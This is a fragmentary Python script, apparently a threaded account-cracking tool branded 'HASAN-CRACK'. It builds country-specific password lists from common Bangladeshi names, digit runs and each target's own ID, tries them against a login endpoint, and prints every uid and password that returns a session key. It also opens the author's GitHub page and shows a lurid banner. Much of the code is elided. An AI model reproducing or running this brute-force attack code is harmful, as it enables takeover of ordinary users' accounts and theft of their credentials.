...
os.system("clear");print("\n\n  \033[1;93mSEXY Girl\n\n");time.sleep(3);os.system('xdg-open https://github.com/KgHasan')
try:
...
def hasan_ua1():
	...
	return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; ꧁☠[🔥]=[GIFT]=[🔥]☠꧂\x07')
#-----------------------------------------------------#
#-----------Logo------------#
os.system('clear')
priti = """ \033[1;92m
...
| |_\ \ (_| | | | | (_| | (_| | 
 \__/\,_|_| |_|\,_|\,_|
           \033[1;33m ۝࿐ \033[38;5;85m GIFT \033[93m࿐۝
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
      \x1b[93m  2024
      \x1b[92m OWNER \x1b[93m : \x1b[92m Christine
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
"""
def lvl():
        print(' \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m')
#-----------Loop System------------#
loop=0
oks=[]
cps=[]
...
def all_country():
	...
	with tred(max_workers=30) as hasan:
		...
		for psx in user:
			...
			if 'pk' in ck:
				...
				passlist = ['Tine11','00998877','sumaiya','jannat','sadiya','nazmul','saiful','soniya','203040','304050','bangladesh','506070','708090','607080','@@@###','908070','jesmin','১২৩৪৫৬','১১২২৩৩','১২৩৪৫৬৭৮','77889900',ids,psx]
			elif 'ind' in ck:
	...
	print('\n')
	lvl()
	print(' \033[38;5;192m~\033[38;5;196m>\033[1;92m The process has completed ✓')
...
def asha(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r \033[1;91m [\033[1;32mHASAN-CRACK\033[1;91m] \033[1;93m%s\033[1;37m <> \033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r \033[1;31m [\033[1;92mHASAN-OK\033[1;91m] \033[1;92m'+uid+' > '+pas)
